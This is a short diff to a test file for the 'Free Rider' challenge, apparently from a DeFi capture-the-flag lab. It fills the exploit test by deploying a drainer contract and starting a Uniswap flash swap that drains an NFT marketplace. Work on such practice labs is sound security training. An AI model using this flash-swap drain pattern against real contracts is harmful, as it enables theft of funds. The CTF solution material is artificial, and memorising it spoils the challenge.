@@ -105,6 +105,14 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        this.drainer = await (await ethers.getContractFactory('FreeRiderDrainer', attacker)).deploy(
+            this.uniswapFactory.address,
+            this.marketplace.address,
+            this.nft.address,
+            this.buyerContract.address,
+            {value: ethers.utils.parseEther('0.1')}
+        );//gives ether to help drainer on paying flash swap fees
+        await this.uniswapPair.connect(attacker).swap(ethers.utils.parseEther('30'), 0, this.drainer.address, [0x1]);
     });
 
     after(async function () {
